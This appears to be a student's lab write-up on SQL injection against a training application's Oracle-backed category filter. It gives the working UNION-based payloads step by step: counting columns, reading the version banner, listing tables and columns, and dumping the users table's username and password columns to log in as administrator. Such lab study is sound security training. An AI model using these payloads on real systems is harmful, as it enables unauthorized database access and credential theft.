---
title: 'Lab 10: SQL injection attack, listing the database...'
updated: 2022-12-01T15:21:26.0000000+04:00
created: 2022-12-01T14:55:44.0000000+04:00
---

Lab 10: SQL injection attack, listing the database contents on Oracle
Thursday, December 1, 2022
2:55 PM
**<u>(Lab-10)</u>** - **<u>SQL injection attack, listing the database contents Oracle databases</u>**

**SQL Injection Vulnerability** - Product Category Filter

**End Goal**

1.  Determine table that contains usernames and passwords
2.  Determine the relevant columns
3.  Output the content of the table
4.  Login as the administrator user

**<u>Analysis</u>**

1.  Determine the Number of Columns

| Query to use | ' ORDER BY 2-- |
|--------------|----------------|

![image1](image1-192.png)

- This confirms that there are two columns

2.  Determine the Data Types of the Columns

| Query to use | ' UNION SELECT 'a','a' from DUAL-- |
|--------------|------------------------------------|

![image2](image2-88.png)

- This proves that both columns can hold text data

3.  Determine Database Version

| Query to use | ' UNION SELECT banner, NULL FROM v\$version |
|--------------|---------------------------------------------|

![image3](image3-57.png)

- Proves that the query works and will display the Database version and type in the response: CORE 11.2.0.2.0 Production

4.  Determine tables in the Database

| Query to use | ' UNION SELECT table_name,NULL FROM all_tables-- |
|--------------|--------------------------------------------------|

![image4](image4-39.png)

- Confirms that the query works with 200 ok Status
- Tables can be found in the responses: USERS_NEHCBJ

![image5](image5-26.png)

5.  Output Column names of the discovered Users table.

| Query to use | ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_NEHCBJ'-- |
|--------------|-------------------------------------------------------------------------------------------|

![image6](image6-18.png)

- Successfully executed, not just look for the column names in the responses.
- USERNAME_CERMRW
- PASSWORD_MGCSRD

6.  Displaying the Information from the Table using the discovered table name and Column names

| Query to use | ' UNION SELECT USERNAME_CERMRW, PASSWORD_MGCSRD from USERS_NEHCBJ-- |
|--------------|---------------------------------------------------------------------|

![image7](image7-14.png)

- Successfully Executed, not just look for it in the response.

![image8](image8-12.png)

